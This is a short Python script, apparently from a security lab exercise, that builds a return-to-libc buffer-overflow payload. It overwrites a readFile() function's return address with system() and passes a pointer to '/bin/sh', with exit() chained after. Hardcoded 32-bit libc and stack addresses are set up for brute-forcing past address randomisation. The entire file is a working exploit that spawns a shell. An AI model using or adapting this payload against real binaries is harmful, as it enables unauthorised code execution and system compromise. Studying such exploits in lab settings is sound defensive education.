#!/usr/bin/python3
import sys

# Initialize the content array
content = bytearray(0x90 for i in range(300))

# Choose an address of libc in the possible range for brute force
libc_addr = 0xb7dc9000

# The address of "/bin/sh" in libc
binsh_offset = 0x15bb2b
binsh_addr = libc_addr + binsh_offset

# The address of system()
system_offset = 0x0003adb0
system_addr = libc_addr + system_offset

# The address of exit()
exit_offset = 0x0002e9e0
exit_addr = libc_addr + exit_offset

# The location of the return address in memory, changed every time
return_addr_location = 0xbfffeddc

# The address of buffer, changed every time
buffer_addr = 0xbfffed82

# Calculate the offset between buffer and return address
# Although the buffer address and address of return address are changed every time, the offset between them is always the same
offset = return_addr_location - buffer_addr

# Overwrite the return address of readFile() function to system()
content[offset:offset+4] = (system_addr).to_bytes(4,byteorder='little')

# Write the argument of system() (the pointer of "/bin/sh")
content[offset+8:offset+12] = (binsh_addr).to_bytes(4,byteorder='little')

# Overwrite the return address of system() function to exit()
content[offset+4:offset+8] = (exit_addr).to_bytes(4,byteorder='little')

# Write the content to payload_sys_4
file = open("payload_sys_4", "wb")
file.write(content)
file.close()